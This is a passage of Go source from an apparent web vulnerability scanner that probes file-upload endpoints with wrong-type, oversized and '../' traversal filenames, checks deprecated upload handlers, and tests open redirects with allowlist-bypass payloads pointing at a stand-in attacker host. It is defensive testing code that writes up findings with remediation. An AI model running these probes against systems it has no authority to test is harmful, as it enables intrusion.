				status, respBody, err := v.sendMultipartUploadProbe(ctx, candidate, headers, fieldName, tc)
				if err != nil {
					continue
				}
				v.tested++
				signal := fileUploadProbeAcceptanceSignal(status, respBody, tc)
				if signal == "" {
					if rejection := fileUploadRejectionSignal(status, respBody, tc.Kind); rejection != "" {
						v.dismissed++
						v.db.InsertNarration(v.scanID, "verifier", "dismissed",
							fmt.Sprintf("%s rejected %s upload probe on field %q with status %d (%s).",
								candidate.Path, tc.Kind, fieldName, status, rejection),
							candidate.URL, nil)
						if fileUploadRejectionTerminalForFieldSearch(status, respBody) {
							break
						}
						continue
					}
					continue
				}
				v.confirmed++
				reported[reportKey] = true
				validationConfirmedByPath[pathKey] = true
				successfulFieldByPath[pathKey] = fieldName
				v.storeFileUploadValidationFinding(candidate, fieldName, tc, status, respBody, signal, authSource)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s accepted %s upload probe (%s) on field %q — %s.",
						candidate.Path, tc.Kind, tc.Description, fieldName, fileUploadProbeNarrationSuffix(tc.Kind)),
					candidate.URL, nil)
				break
			}
		}
	}
	if deprecatedInterfaceAllowed {
		v.probeDeprecatedUploadInterfaces(ctx, candidates, validationConfirmedByPath)
		return
	}
	if count := deprecatedUploadCandidateCount(candidates); count > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Skipped %d deprecated/retired upload-interface probe candidate(s) because testing authority is %q.",
				count, firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{
				"required_authority": policy.AuthorityFullControl,
				"current_authority":  firstNonBlank(string(v.authority), string(policy.AuthorityActive)),
			})
	}
}

func fileUploadProbeCases(now int64) []fileUploadProbeCase {
	return []fileUploadProbeCase{
		{
			Kind:        "type",
			Filename:    fmt.Sprintf("aobtd-upload-type-%d.txt", now),
			ContentType: "text/plain",
			Content:     []byte("AOBTD benign upload validation probe: text/plain should be rejected when only document/archive uploads are allowed.\n"),
			Description: "text/plain file with .txt extension",
			VulnType:    "file_upload_type_bypass",
			ParamName:   "file type",
		},
		{
			Kind:        "path",
			Filename:    fmt.Sprintf("../aobtd-upload-traversal-%d.txt", now),
			ContentType: "text/plain",
			Content:     []byte("AOBTD benign upload filename traversal probe.\n"),
			Description: "filename containing a parent-directory traversal segment",
			VulnType:    "path_traversal",
			ParamName:   "filename",
		},
		{
			Kind:        "size",
			Filename:    fmt.Sprintf("aobtd-upload-size-%d.pdf", now),
			ContentType: "application/pdf",
			Content:     append([]byte("%PDF-1.3\n% AOBTD benign oversized upload validation probe\n"), bytes.Repeat([]byte("A"), 120_000)...),
			Description: "120KB PDF-like file",
			VulnType:    "file_upload_size_bypass",
			ParamName:   "file size",
		},
	}
}

func fileUploadValidationAuthority(authority policy.TestingAuthority) (validationAllowed bool, deprecatedInterfaceAllowed bool) {
	switch authority {
	case policy.AuthorityActive:
		return true, true
	case policy.AuthorityFullControl:
		return true, true
	default:
		return false, false
	}
}

func (v *VerifierAgent) fileUploadValidationCandidates(ctx context.Context, entries []types.TrafficEntry, target string) []fileUploadValidationCandidate {
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	if origin == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []fileUploadValidationCandidate
	add := func(method, path, source string, fields []string) {
		path = strings.TrimSpace(path)
		if path == "" || !fileUploadPathLooksWritable(path) {
			return
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		if method == "" {
			method = http.MethodPost
		}
		key := strings.ToUpper(method) + " " + strings.ToLower(path)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, fileUploadValidationCandidate{
			URL:        origin + path,
			Path:       path,
			Method:     strings.ToUpper(method),
			Source:     source,
			FieldNames: fileUploadFieldCandidates(path, fields),
		})
	}

	artifactCache := make(map[string]string)
	for _, entry := range entries {
		if len(out) >= 8 {
			break
		}
		if strings.Contains(strings.ToLower(entry.Request.Headers["Content-Type"]), "multipart/form-data") {
			add(entry.Request.Method, entry.Request.Path, "observed multipart/form-data request", multipartFieldNamesFromBody(entry.Request.Body))
		}
		if !fileUploadClientArtifactCandidate(entry) {
			continue
		}
		text, _, ok := v.clientCredentialArtifactText(ctx, entry, artifactCache)
		if !ok {
			continue
		}
		for _, path := range fileUploadPathsFromText(text) {
			add(http.MethodPost, path, "same-origin client artifact exposed file-upload API", fileUploadFieldNamesFromText(text, path))
			if len(out) >= 8 {
				break
			}
		}
	}
	return out
}

func fileUploadClientArtifactCandidate(entry types.TrafficEntry) bool {
	ct := strings.ToLower(strings.TrimSpace(entry.Response.ContentType))
	path := strings.ToLower(strings.TrimSpace(entry.Request.Path + " " + entry.Request.URL))
	if strings.Contains(ct, "text/html") || strings.Contains(ct, "application/xhtml") {
		return false
	}
	return strings.Contains(ct, "javascript") ||
		strings.Contains(ct, "json") ||
		strings.Contains(ct, "text/plain") ||
		strings.Contains(path, ".js") ||
		strings.Contains(path, ".mjs") ||
		strings.Contains(path, ".json") ||
		strings.Contains(path, ".config") ||
		strings.Contains(path, ".env")
}

var fileUploadPathRE = regexp.MustCompile(`(?i)/(?:api|rest)?/?[A-Za-z0-9_./-]*(?:file-upload|uploads?|upload|files?|attachments?|documents?|images?|memories)[A-Za-z0-9_./-]*`)

func fileUploadPathsFromText(text string) []string {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	for _, match := range fileUploadPathRE.FindAllString(text, 32) {
		path := strings.Trim(match, `"'`+"` ;,)")
		if !fileUploadPathLooksWritable(path) {
			continue
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		key := strings.ToLower(path)
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, path)
	}
	return out
}

func fileUploadPathLooksWritable(path string) bool {
	lower := strings.ToLower(strings.TrimSpace(path))
	if lower == "" || strings.Contains(lower, "${") || strings.Contains(lower, "{") || strings.Contains(lower, "}") {
		return false
	}
	if strings.HasPrefix(lower, "//") || strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") {
		return false
	}
	for _, prefix := range []string{"/var/", "/etc/", "/usr/", "/opt/", "/home/", "/root/", "/tmp/"} {
		if strings.HasPrefix(lower, prefix) {
			return false
		}
	}
	if strings.Contains(lower, "/assets/") || strings.Contains(lower, "/public/") || strings.Contains(lower, "/static/") {
		return false
	}
	if strings.Contains(lower, "socket.io") || strings.Contains(lower, "captcha") {
		return false
	}
	last := lower
	if idx := strings.LastIndex(last, "/"); idx >= 0 {
		last = last[idx+1:]
	}
	if strings.Contains(last, ".") && !strings.Contains(lower, "file-upload") {
		return false
	}
	return strings.Contains(lower, "upload") ||
		strings.Contains(lower, "file") ||
		strings.Contains(lower, "attachment") ||
		strings.Contains(lower, "document") ||
		strings.Contains(lower, "image") ||
		strings.Contains(lower, "memories")
}

var formDataAppendFieldRE = regexp.MustCompile(`(?i)\.append\(\s*["']([A-Za-z0-9_-]{1,48})["']`)

func fileUploadFieldNamesFromText(text string, path string) []string {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	add := func(field string) {
		field = strings.TrimSpace(field)
		if field == "" {
			return
		}
		lower := strings.ToLower(field)
		switch lower {
		case "file", "image", "upload", "attachment", "document", "avatar", "picture", "photo":
		default:
			return
		}
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, field)
	}
	for _, m := range formDataAppendFieldRE.FindAllStringSubmatch(text, 24) {
		if len(m) > 1 {
			add(m[1])
		}
	}
	return fileUploadFieldCandidates(path, out)
}

func multipartFieldNamesFromBody(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	text := string(body)
	matches := regexp.MustCompile(`(?i)name="([^"]{1,64})"`).FindAllStringSubmatch(text, 16)
	var out []string
	seen := make(map[string]bool)
	for _, m := range matches {
		if len(m) < 2 {
			continue
		}
		field := strings.TrimSpace(m[1])
		lower := strings.ToLower(field)
		if lower == "" || seen[lower] {
			continue
		}
		seen[lower] = true
		out = append(out, field)
	}
	return out
}

func fileUploadFieldCandidates(path string, fields []string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(field string) {
		field = strings.TrimSpace(field)
		if field == "" {
			return
		}
		lower := strings.ToLower(field)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, field)
	}
	lowerPath := strings.ToLower(path)
	if strings.Contains(lowerPath, "image") || strings.Contains(lowerPath, "photo") || strings.Contains(lowerPath, "memories") {
		add("image")
	}
	for _, f := range fields {
		add(f)
	}
	for _, f := range []string{"file", "upload", "attachment", "document", "image"} {
		add(f)
	}
	return out
}

func prioritizeUploadFields(fields []string, preferred string) []string {
	if strings.TrimSpace(preferred) == "" || len(fields) == 0 {
		return fields
	}
	seen := make(map[string]bool)
	var out []string
	add := func(field string) {
		field = strings.TrimSpace(field)
		if field == "" {
			return
		}
		lower := strings.ToLower(field)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, field)
	}
	add(preferred)
	for _, field := range fields {
		add(field)
	}
	return out
}

func uploadProbeFields(fields []string, preferred string, kind string) []string {
	prioritized := prioritizeUploadFields(fields, preferred)
	if kind != "path" || strings.TrimSpace(preferred) == "" {
		return prioritized
	}
	return []string{strings.TrimSpace(preferred)}
}

func fileUploadProbeNarrationSuffix(kind string) string {
	if kind == "path" {
		return "uploaded filename/path normalization is incomplete"
	}
	return "server-side upload validation is incomplete"
}

func escapeMultipartHeaderValue(value string) string {
	return strings.NewReplacer("\\", "\\\\", `"`, `\"`, "\r", "%0D", "\n", "%0A").Replace(value)
}

func (v *VerifierAgent) sendMultipartUploadProbe(ctx context.Context, candidate fileUploadValidationCandidate, headers map[string]string, fieldName string, tc fileUploadProbeCase) (int, string, error) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	partHeader := make(textproto.MIMEHeader)
	partHeader.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`,
		escapeMultipartHeaderValue(fieldName), escapeMultipartHeaderValue(tc.Filename)))
	partHeader.Set("Content-Type", firstNonBlank(tc.ContentType, "application/octet-stream"))
	part, err := writer.CreatePart(partHeader)
	if err != nil {
		return 0, "", err
	}
	if _, err := part.Write(tc.Content); err != nil {
		return 0, "", err
	}
	_ = writer.WriteField("caption", "AOBTD upload validation probe")
	_ = writer.WriteField("message", "AOBTD upload validation probe")
	_ = writer.WriteField("description", "AOBTD upload validation probe")
	if err := writer.Close(); err != nil {
		return 0, "", err
	}

	method := firstNonBlank(candidate.Method, http.MethodPost)
	req, err := http.NewRequestWithContext(ctx, method, candidate.URL, &buf)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "AOBTD/Verifier (upload validation probe)")
	for k, val := range headers {
		lower := strings.ToLower(strings.TrimSpace(k))
		if lower == "" || lower == "host" || lower == "content-length" || lower == "content-type" {
			continue
		}
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, string(body), nil
}

func fileUploadAcceptanceSignal(status int, body string, kind string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	lower := strings.ToLower(body)
	if kind != "path" && strings.Contains(lower, "contentdispositionupload") {
		return ""
	}
	for _, marker := range []string{
		"invalid", "not allowed", "forbidden", "unsupported", "too large",
		"file too large", "max file", "maximum file", "mime", "extension",
		"error", "reject",
	} {
		if strings.Contains(lower, marker) {
			return ""
		}
	}
	if strings.TrimSpace(body) != "" {
		if bodyLooksLikeUnauthenticatedHTMLShell(body) {
			return ""
		}
		if bodyLooksLikeHTMLDocument(body) && !fileUploadHTMLPositiveMarker(lower) {
			return ""
		}
	}
	switch kind {
	case "type":
		return "server returned 2xx for disallowed text/plain .txt upload"
	case "size":
		return "server returned 2xx for oversized upload"
	default:
		return "server returned 2xx for negative upload-validation probe"
	}
}

func fileUploadProbeAcceptanceSignal(status int, body string, tc fileUploadProbeCase) string {
	if tc.Kind == "path" {
		return fileUploadPathTraversalAcceptanceSignal(status, body, tc.Filename)
	}
	return fileUploadAcceptanceSignal(status, body, tc.Kind)
}

func fileUploadPathTraversalAcceptanceSignal(status int, body string, filename string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	lower := strings.ToLower(body)
	for _, marker := range []string{
		"invalid", "not allowed", "forbidden", "unsupported",
		"error", "reject",
	} {
		if strings.Contains(lower, marker) {
			return ""
		}
	}
	if strings.TrimSpace(body) != "" {
		if bodyLooksLikeUnauthenticatedHTMLShell(body) {
			return ""
		}
		if bodyLooksLikeHTMLDocument(body) && !fileUploadHTMLPositiveMarker(lower) {
			return ""
		}
	}
	if !strings.Contains(lower, "../") &&
		!strings.Contains(lower, `..\`) &&
		!strings.Contains(lower, "..%2f") &&
		!strings.Contains(lower, "..%5c") {
		return ""
	}
	base := strings.ToLower(strings.TrimLeft(strings.ReplaceAll(filename, "\\", "/"), "./"))
	if idx := strings.LastIndex(base, "/"); idx >= 0 {
		base = base[idx+1:]
	}
	if base != "" && !strings.Contains(lower, base) {
		return ""
	}
	return "response reflects parent-directory traversal segment in uploaded filename/path"
}

func fileUploadPositiveMarker(lowerBody string) bool {
	for _, marker := range []string{
		"upload successful", "uploaded successfully", "successfully uploaded", "file uploaded",
		"upload complete", `"url"`, `"path"`, `"filename"`, `"file"`,
	} {
		if strings.Contains(lowerBody, marker) {
			return true
		}
	}
	return false
}

func fileUploadHTMLPositiveMarker(lowerBody string) bool {
	for _, marker := range []string{
		"upload successful", "uploaded successfully", "successfully uploaded", "file uploaded",
		"upload complete",
	} {
		if strings.Contains(lowerBody, marker) {
			return true
		}
	}
	return false
}

func buildPlaceholderHTTPMultipartRequest(method, rawURL, bodyDescription string) string {
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = http.MethodPost
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Sprintf("%s %s HTTP/1.1\nContent-Type: multipart/form-data\n\n%s",
			method, rawURL, bodyDescription)
	}
	requestURI := parsed.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	if parsed.Scheme == "" || parsed.Host == "" {
		return fmt.Sprintf("%s %s HTTP/1.1\nContent-Type: multipart/form-data\n\n%s",
			method, requestURI, bodyDescription)
	}
	return fmt.Sprintf("%s %s HTTP/1.1\nHost: %s\nContent-Type: multipart/form-data\n\n%s",
		method, requestURI, parsed.Host, bodyDescription)
}

func fileUploadRejectionSignal(status int, body string, kind string) string {
	lower := strings.ToLower(body)
	if kind != "path" && strings.Contains(lower, "contentdispositionupload") {
		return "content-disposition upload sink"
	}
	if status == 413 {
		return "payload too large"
	}
	if status == 415 {
		return "unsupported media type"
	}
	for _, marker := range []string{"invalid", "not allowed", "unsupported", "too large", "max file", "maximum file", "mime", "extension"} {
		if strings.Contains(lower, marker) {
			return marker
		}
	}
	if status >= 400 && status < 500 {
		return fmt.Sprintf("HTTP %d", status)
	}
	if status >= 500 && kind == "size" {
		return fmt.Sprintf("server error HTTP %d", status)
	}
	return ""
}

func fileUploadRejectionTerminalForFieldSearch(status int, body string) bool {
	if status < 200 || status >= 300 {
		return false
	}
	lower := strings.ToLower(body)
	return strings.Contains(lower, `"isvalid":false`) ||
		strings.Contains(lower, "input is invalid") ||
		strings.Contains(lower, "contentdispositionupload")
}

func (v *VerifierAgent) storeFileUploadValidationFinding(candidate fileUploadValidationCandidate, fieldName string, tc fileUploadProbeCase, status int, respBody string, signal string, authSource string) {
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := firstNonBlank(candidate.Method, http.MethodPost)
	title := ""
	impact := ""
	remediation := ""
	switch tc.Kind {
	case "type":
		title = fmt.Sprintf("File upload accepted disallowed type at %s", path)
		impact = "Attackers can upload unexpected file formats that may bypass downstream processing assumptions, moderation, malware scanning, or content-disposition controls."
		remediation = "Enforce an explicit server-side extension/MIME/magic-byte allowlist. Treat client-side upload widgets as UX only, not security validation."
	case "size":
		title = fmt.Sprintf("File upload accepted oversized file at %s", path)
		impact = "Attackers can consume storage, CPU, bandwidth, or parser memory by submitting files larger than the advertised or intended limit."
		remediation = "Enforce upload size limits server-side before buffering or persisting the file, and return 413/400 when the limit is exceeded."
	case "path":
		title = fmt.Sprintf("File upload filename path traversal at %s", path)
		impact = "Attackers may be able to influence the server-side storage path or downstream file reference by including parent-directory traversal segments in uploaded filenames."
		remediation = "Normalize uploaded filenames to a server-generated basename. Reject path separators and parent-directory segments before storage, response generation, or Content-Disposition handling."
	default:
		title = fmt.Sprintf("File upload validation bypass at %s", path)
		impact = "Server-side upload validation is incomplete."
		remediation = "Validate upload type, size, and content server-side before accepting files."
	}
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: fmt.Sprintf("%s accepted a %s (%s) on multipart field %q. Signal: %s. Source: %s. Auth source: %s.", path, tc.Kind, tc.Description, fieldName, signal, candidate.Source, firstNonBlank(authSource, "none/anonymous")),
		Severity:    types.SeverityMedium,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    tc.VulnType,
		ParamName:   tc.ParamName,
		Payload:     fmt.Sprintf("field=%s filename=%s content_type=%s bytes=%d", fieldName, tc.Filename, tc.ContentType, len(tc.Content)),
		PocRequest: buildPlaceholderHTTPMultipartRequest(method, candidate.URL,
			fmt.Sprintf("field=%s; filename=%s; content-type=%s; bytes=%d",
				fieldName, tc.Filename, tc.ContentType, len(tc.Content))),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(respBody, 700)),
		StepsToReproduce: fmt.Sprintf(
			"1. Send multipart %s %s with field `%s`, filename `%s`, content-type `%s`, and %d bytes.\n"+
				"2. Observe the server returns %d (%s) instead of rejecting the upload.",
			method, path, fieldName, tc.Filename, tc.ContentType, len(tc.Content), status, signal),
		Impact:      impact,
		Remediation: remediation,
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nField: %s\nFilename: %s\nResponse preview: %s",
			candidate.URL, status, signal, fieldName, tc.Filename, truncateString(respBody, 500)),
	})
}

func (v *VerifierAgent) probeDeprecatedUploadInterfaces(ctx context.Context, candidates []fileUploadValidationCandidate, skipPaths map[string]bool) {
	now := time.Now().UnixNano()
	cases := []fileUploadProbeCase{
		{
			Kind:        "deprecated-interface",
			Filename:    fmt.Sprintf("aobtd-deprecated-interface-%d.xml", now),
			ContentType: "application/xml",
			Content:     []byte(`<complaint><message>AOBTD benign deprecated interface reachability probe</message></complaint>`),
			Description: "benign XML business-upload payload",
			VulnType:    "deprecated_upload_interface_reachable",
			ParamName:   "file",
		},
		{
			Kind:        "deprecated-interface",
			Filename:    fmt.Sprintf("aobtd-deprecated-interface-%d.yaml", now),
			ContentType: "application/x-yaml",
			Content:     []byte("message: AOBTD benign deprecated interface reachability probe\n"),
			Description: "benign YAML business-upload payload",
			VulnType:    "deprecated_upload_interface_reachable",
			ParamName:   "file",
		},
	}

	attempts := 0
	const maxDeprecatedUploadAttempts = 18
	reported := make(map[string]bool)
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxDeprecatedUploadAttempts {
			return
		}
		if !deprecatedUploadPathLooksWorthTrying(candidate.Path) {
			continue
		}
		pathKey := strings.ToLower(candidate.Path)
		if shouldSkipDeprecatedUploadInterface(candidate.Path, skipPaths) {
			continue
		}
		if reported[pathKey] {
			continue
		}
		headers, authSource := v.credentialHeadersForURL(candidate.URL)
		for _, tc := range cases {
			if ctx.Err() != nil || attempts >= maxDeprecatedUploadAttempts {
				return
			}
			for _, fieldName := range prioritizeUploadFields(candidate.FieldNames, "") {
				if ctx.Err() != nil || attempts >= maxDeprecatedUploadAttempts {
					return
				}
				attempts++
				status, respBody, err := v.sendMultipartUploadProbe(ctx, candidate, headers, fieldName, tc)
				if err != nil {
					continue
				}
				v.tested++
				signal := deprecatedUploadInterfaceSignal(status, respBody)
				if signal == "" {
					if status >= 400 && status < 500 {
						v.dismissed++
					}
					continue
				}
				v.confirmed++
				reported[pathKey] = true
				v.storeDeprecatedUploadInterfaceFinding(candidate, fieldName, tc, status, respBody, signal, authSource)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s still routes %s uploads into a deprecated/retired interface handler (%s).",
						candidate.Path, tc.Description, signal),
					candidate.URL, nil)
				break
			}
			if reported[pathKey] {
				break
			}
		}
	}
}

func deprecatedUploadCandidateCount(candidates []fileUploadValidationCandidate) int {
	count := 0
	for _, candidate := range candidates {
		if deprecatedUploadPathLooksWorthTrying(candidate.Path) {
			count++
		}
	}
	return count
}

func deprecatedUploadPathLooksWorthTrying(path string) bool {
	lower := strings.ToLower(strings.TrimSpace(path))
	if lower == "" {
		return false
	}
	for _, blocked := range []string{"profile", "avatar", "photo", "image/url", "memories"} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	return strings.Contains(lower, "upload") ||
		strings.Contains(lower, "import") ||
		strings.Contains(lower, "complaint") ||
		strings.Contains(lower, "document") ||
		strings.Contains(lower, "file")
}

func shouldSkipDeprecatedUploadInterface(path string, validationConfirmedByPath map[string]bool) bool {
	if len(validationConfirmedByPath) == 0 {
		return false
	}
	return validationConfirmedByPath[strings.ToLower(strings.TrimSpace(path))]
}

func deprecatedUploadInterfaceSignal(status int, body string) string {
	lower := strings.ToLower(body)
	switch {
	case strings.Contains(lower, "deprecated"):
		return "response says deprecated"
	case strings.Contains(lower, "retired"):
		return "response says retired"
	case strings.Contains(lower, "no longer supported"):
		return "response says no longer supported"
	case strings.Contains(lower, "gone") && status == http.StatusGone:
		return "HTTP 410 Gone"
	case status == http.StatusGone && strings.Contains(lower, "upload"):
		return "HTTP 410 from upload handler"
	default:
		return ""
	}
}

func (v *VerifierAgent) storeDeprecatedUploadInterfaceFinding(candidate fileUploadValidationCandidate, fieldName string, tc fileUploadProbeCase, status int, respBody string, signal string, authSource string) {
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := firstNonBlank(candidate.Method, http.MethodPost)
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title: fmt.Sprintf("Deprecated upload interface reachable at %s", path),
		Description: fmt.Sprintf(
			"%s routed a %s through a deprecated/retired upload handler on multipart field %q. Signal: %s. Source: %s. Auth source: %s.",
			path, tc.Description, fieldName, signal, candidate.Source, firstNonBlank(authSource, "none/anonymous")),
		Severity:   types.SeverityLow,
		Confidence: types.ConfidenceConfirmed,
		EndpointID: method + " " + path,
		VulnType:   "deprecated_upload_interface_reachable",
		ParamName:  fieldName,
		Payload:    fmt.Sprintf("field=%s filename=%s content_type=%s bytes=%d", fieldName, tc.Filename, tc.ContentType, len(tc.Content)),
		PocRequest: buildPlaceholderHTTPMultipartRequest(method, candidate.URL,
			fmt.Sprintf("field=%s; filename=%s; content-type=%s; bytes=%d",
				fieldName, tc.Filename, tc.ContentType, len(tc.Content))),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(respBody, 700)),
		StepsToReproduce: fmt.Sprintf(
			"1. Send multipart %s %s with field `%s`, filename `%s`, content-type `%s`.\n"+
				"2. Observe the request reaches a deprecated/retired handler (%s) instead of being shut off at routing/auth boundaries.",
			method, path, fieldName, tc.Filename, tc.ContentType, signal),
		Impact:      "Retired upload/M2M interfaces often keep old parsers, auth assumptions, and batch-processing semantics alive. Attackers use them as alternate attack surfaces for parser bugs, SSRF/XXE-style payloads, data import abuse, or policy bypasses.",
		Remediation: "Remove deprecated upload routes from production routing. If a migration window is required, gate the interface behind explicit authentication/authorization, strict parser hardening, file-type allowlists, size limits, and telemetry until it is fully decommissioned.",
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nField: %s\nFilename: %s\nResponse preview: %s",
			candidate.URL, status, signal, fieldName, tc.Filename, truncateString(respBody, 500)),
	})
}

// probeOpenRedirect tries a small set of redirect endpoints with an
// attacker-controlled target URL and confirms via the response's Location
// header (for 30x) or body content (for meta-refresh/HTML redirects).
// Mapped to Juice Shop's redirectChallenge / redirectCryptoCurrencyChallenge.
func (v *VerifierAgent) probeOpenRedirect(ctx context.Context, target string) {
	// Target discovery: endpoints whose query parameters CARRY a URL value
	// (the crawler actually saw the server handling a URL-valued param).
	// That's the generic open-redirect surface on any application.
	discovered, _ := discovery.DiscoverRedirectCandidates(v.db, v.scanID)

	// For each discovered endpoint we'll try replacing the URL-valued
	// parameter with an attacker URL. Fall back to a small corpus of
	// common redirect-endpoint paths + param names when the crawler
	// captured nothing (typical on SPAs where the redirect link was never
	// clicked).
	type redirectTarget struct {
		urlWithoutQuery string
		param           string
	}
	var targets []redirectTarget
	seen := make(map[string]bool)
	addTarget := func(base, param string) {
		base = strings.TrimSpace(base)
		param = strings.TrimSpace(param)
		if base == "" || param == "" {
			return
		}
		key := base + "|" + strings.ToLower(param)
		if seen[key] {
			return
		}
		seen[key] = true
		targets = append(targets, redirectTarget{base, param})
	}
	for _, ep := range discovered {
		base := strings.SplitN(ep.URL, "?", 2)[0]
		for _, p := range ep.Params {
			addTarget(base, p)
		}
	}
	for _, observed := range v.observedRedirectTargets(ctx) {
		addTarget(observed.urlWithoutQuery, observed.param)
	}
	if len(targets) == 0 {
		// Corpus fallback — well-known path + param names. Kept small;
		// each entry is an industry-standard convention (OWASP cheat-sheet).
		for _, path := range []string{"/redirect", "/r", "/redir", "/out", "/goto", "/link"} {
			for _, param := range redirectParamNameCandidates("", "") {
				addTarget(target+path, param)
			}
		}
	}

	const redirectProbeHost = "evil.aobtd.test"

	// Learn redirect allowlist seeds from the application itself. Modern apps
	// often block arbitrary URLs but allow a legacy set of external
	// destinations; substring-based allowlists can then be bypassed by placing
	// a legitimate seed inside an attacker-controlled destination.
	seeds := v.discoverExternalRedirectSeeds(target)
	payloads := redirectBypassPayloads(redirectProbeHost, seeds)

	// Don't follow redirects — we need the Location header the server sends.
	origCheck := v.client.CheckRedirect
	v.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	defer func() { v.client.CheckRedirect = origCheck }()

	confirmedBypassByPath := make(map[string]bool)
	confirmedStale := false
	const maxOpenRedirectFindings = 25
	for _, rt := range targets {
		if ctx.Err() != nil {
			return
		}
		path := rt.urlWithoutQuery
		if parsed, err := url.Parse(rt.urlWithoutQuery); err == nil {
			path = parsed.Path
		}
		if !confirmedBypassByPath[path] {
			for _, payload := range payloads {
				u := fmt.Sprintf("%s?%s=%s", rt.urlWithoutQuery, rt.param, url.QueryEscape(payload))
				resp, body, _, err := v.proactiveGET(ctx, u)
				if err != nil || resp == nil {
					continue
				}
				v.tested++

				loc := resp.Header.Get("Location")
				// Confirmation: response redirects AND Location includes our
				// attacker host as the parsed redirect destination. `.aobtd.test`
				// TLD is reserved for testing; parsing avoids query-string
				// false-positives such as `/logout?next=https://evil...`.
				if resp.StatusCode >= 300 && resp.StatusCode < 400 &&
					locationRedirectsToHost(loc, redirectProbeHost) {
					v.confirmed++
					confirmedBypassByPath[path] = true
					profile := types.PageProfile{
						ID: "GET " + path, URL: u, Method: "GET",
					}
					v.storeFinding(profile, types.Finding{
						Title: fmt.Sprintf("Open redirect on %s (allowlist bypass)", path),
						Description: fmt.Sprintf(
							"GET %s with `%s=%s` returned a %d redirect whose Location header "+
								"pointed at the attacker-controlled domain. The payload embeds an "+
								"application-observed external URL, which indicates the redirect "+
								"allowlist is being matched too loosely.",
							path, rt.param, payload, resp.StatusCode),
						Severity:   types.SeverityMedium,
						Confidence: types.ConfidenceConfirmed,
						EndpointID: "GET " + path,
						VulnType:   "open_redirect",
						ParamName:  rt.param,
						Payload:    payload,
						PocRequest: fmt.Sprintf("GET %s?%s=%s HTTP/1.1\nHost: <target>\n",
							path, rt.param, payload),
						PocResponse: fmt.Sprintf("HTTP/1.1 %d\nLocation: %s\n",
							resp.StatusCode, loc),
						StepsToReproduce: fmt.Sprintf(
							"1. Send GET %s?%s=%s\n"+
								"2. Server replies %d with Location: %s\n"+
								"3. The final destination host is attacker-controlled even though the payload contains an allowlisted URL.",
							path, rt.param, payload, resp.StatusCode, loc),
						Impact: "Phishing lures that appear to originate from the legitimate domain; " +
							"credential harvesting; OAuth-flow hijacking when redirect parameters are reused in auth flows.",
						Remediation: "Validate redirect targets by parsing the final URL and comparing the destination origin/path " +
							"against exact allowlist entries. Do not use substring matching, userinfo tricks, fragments, or query-string containment as authorization.",
						Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nLocation: %s\nBody: %s",
							u, resp.StatusCode, loc, truncateString(body, 300)),
					})
					v.db.InsertNarration(v.scanID, "verifier", "confirmed",
						fmt.Sprintf("%s accepted an allowlist-bypass redirect via `%s=%s`; final host is attacker-controlled.",
							path, rt.param, payload),
						u, nil)
					break
				}
				v.dismissed++
			}
		}

		if confirmedStale {
			continue
		}
		for _, seed := range seeds {
			category := redirectSeedRiskCategory(seed.URL)
			if category == "" {
				continue
			}
			u := fmt.Sprintf("%s?%s=%s", rt.urlWithoutQuery, rt.param, url.QueryEscape(seed.URL))
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil {
				continue
			}
			v.tested++

			loc := resp.Header.Get("Location")
			if resp.StatusCode >= 300 && resp.StatusCode < 400 &&
				locationRedirectsToExactURL(loc, seed.URL) {
				v.confirmed++
				confirmedStale = true
				path := rt.urlWithoutQuery
				if parsed, err := url.Parse(rt.urlWithoutQuery); err == nil {
					path = parsed.Path
				}
